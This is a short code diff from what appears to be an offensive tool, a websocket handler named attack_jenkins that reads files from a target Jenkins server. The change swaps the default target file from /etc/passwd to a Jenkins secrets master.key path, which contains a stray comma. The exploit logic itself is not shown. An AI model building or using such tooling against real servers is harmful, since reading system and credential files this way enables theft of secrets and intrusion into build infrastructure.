@@ -15,7 +15,7 @@ async def attack_jenkins(websocket: WebSocket):
         data = json.loads(init_data)
 
         jenkins_url = data.get("jenkins_url")
-        file_path = data.get("file_path", "/etc/passwd")
+        file_path = data.get("file_path", "/home/ubuntu/,jenkins/secrets/master.key")
 
         if not jenkins_url:
             await websocket.send_text(json.dumps({"type": "error", "message": "jenkins_url is needed."}))
